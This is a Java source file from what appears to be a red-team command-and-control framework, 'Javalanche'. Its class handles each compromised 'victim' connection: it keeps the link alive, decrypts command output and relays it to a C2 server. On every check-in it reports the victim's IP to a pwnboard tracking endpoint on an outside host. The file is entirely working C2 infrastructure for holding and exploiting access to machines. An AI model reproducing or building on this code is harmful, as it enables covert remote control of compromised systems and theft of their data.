package Servers.Beacon;

import Servers.Duplexer;
import Servers.keepAlive;
import Servers.encryption.aes.*;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;

public class BeaconClientHandler implements Runnable{
    // IP address of the client
    private String IPAddress;

    // Operating System of the client
    private String OS;

    // Pointer to the duplexer that is used to send/receive with client
    private Duplexer duplexer;

    // Pointer back to the Beacon Server that is associated with this client
    private BeaconServer beaconServer;

    // Sentinel = true when this client is still active, when the client connection is lost Sentinel = false
    private Boolean sentinel = true;

    // Class and thread that is used to send KEEP_ALIVE messages to the client to keep the connection alive
    private keepAlive keepAliveClass;
    private Thread keepAliveThread;

    // Object lock used to make sure that this thread is able to safetly access the duplexer
    private Object sendLock;

    // Variables used to send HTTP Requests to pwnboard. pwnboard is used to keep track of what machines red team still has access to.
    private URI pwnboardUri = null;
    private URL pwnboardUrl = null;
    private HttpURLConnection pwnboardConnection = null;
    private String pwnboardData;
    private Object pwnBoardLock;
    private pwnBoardRequest pwnBoardRequestObject;

    // Class used to do aes encryption
    private aes aes;

    /**
     * Use this Class to create a new thread to handle each victim connection
     * 
     * @param IPAddress IP address of the client (victim)
     * @param duplexer Pointer to the duplexer so that this thread can receive messages from the client
     * @param beaconServer Pointer to the Becon Server that this client is associated with
     * @param os Operating System of this client
     */
    protected BeaconClientHandler(String IPAddress, Duplexer duplexer, BeaconServer beaconServer, String OS, Object shellLock, aes aes){
        this.IPAddress = IPAddress;
        this.duplexer = duplexer;
        this.beaconServer = beaconServer;
        this.OS = OS;
        this.sendLock = new Object();
        this.keepAliveClass = new keepAlive(this.duplexer, sendLock, true, false, aes);
        this.keepAliveThread = new Thread(keepAliveClass);
        this.aes = aes;

        try{
            this.pwnboardUri = new URI("https://margs.salsas.bar/pwn/boxaccess");
            this.pwnboardUrl = this.pwnboardUri.toURL();
        } catch (URISyntaxException e){
            e.printStackTrace();
        } catch (MalformedURLException e){
            e.printStackTrace();
        }
        this.pwnboardData = "{\"ip\": \"" + IPAddress + "\", \"application\": \"Javalanche\", \"access_type\": \"beacon\"}";
        //this.pwnboardData = "{\"ip\": \"10.1.1.1\", \"application\": \"Javalanche\", \"access_type\": \"beacon\"}";
        this.pwnBoardLock = new Object();

        this.pwnBoardRequestObject = new pwnBoardRequest(pwnboardUrl, pwnboardConnection, pwnboardData, pwnBoardLock);
    }

    protected void quit(String reason) throws IOException{
        duplexer.close();
    }

    /**
     * Use this function to have the thread send a message to the client
     * 
     * @param message Message to be sent
     */
    protected void sendToClient(String message){
        if(sentinel){
            synchronized(sendLock){
                duplexer.send(aes.encrypt(message), true);
            }
        }
    }

    /**
     * Function used to handle anything that needs to happen when a client disconnects
     * Sends a message in the Beacon Server Terminal, Sends a message to the C2 Server, 
     * Adds a mesasge at the end of the response dictionary, and closes all of the
     * threads associated with this client. 
     * @param e - Error message stack trace to be printed. If no stack trace should be printed, e should be null
     */
    private void clientDisconnect(Exception e){
        sentinel = false;
        try{
            duplexer.close();
            keepAliveClass.stopKeepAlive();
        } catch (IOException d){
            d.printStackTrace();
        }
        sendResponseToC2("client_disconnect", "Lost " + OS + " Client");
        System.out.println(IPAddress + " disconnected");
        if(e != null){
            e.printStackTrace();
        }
    }

    /**
     * Function used to send messages to the C2 Server
     * IP address: is the IP Address of the client
     * Type can be one of the following fields
     *  - client_command_response: Data contains the output from running a command
     *  - client_disconnect: A client has disconnected from the C2 Server
     *  - client_connect: The Beacon Server has received a new client
     * 
     * @param type - type of message
     * @param data - data of message
     */
    private void sendResponseToC2(String type, String data){
        String message = "{\"ip\": \"" + IPAddress + "\", \"type\": \"" + type + "\", \"data\": \"" + data + "\"}";
        beaconServer.sendDataToC2Server(message);
    }

    @Override
    public void run(){
        // Start the Thread to Send KEEP_ALIVE messages to the client every 30 seconds
        keepAliveThread.start();

        // Create a new thread responsible for updating pwnBoard
        Thread pwnBoardRequestThread = new Thread(pwnBoardRequestObject);
        pwnBoardRequestThread.start();

        String encrypted = "";
        String response = "";
        while(sentinel){ 
            try{
                try{
                    encrypted = duplexer.receive(true);
                } catch (java.lang.NumberFormatException e){
                    clientDisconnect(e);
                }
                
                response = aes.decrypt(encrypted);

                // When the linux client disconnects, for some reason is just sends a lot of null messages over and over
                if(response == null){
                    clientDisconnect(null);
                }

                // Every time we receive a message from our client, we want to notify pwnboard that we still have access to this machine
                synchronized(pwnBoardLock){
                    pwnBoardLock.notify();
                }

                // Send client response back to C2
                if(!(response.equals("KEEP_ALIVE"))){
                    sendResponseToC2("client_command_response", response);
                }
            } catch(java.net.SocketException e){
                clientDisconnect(e);
            } 
            
            catch (IOException e){
                clientDisconnect(e);
            } catch (java.lang.NullPointerException e){
                clientDisconnect(e);
            }
        }
    }
}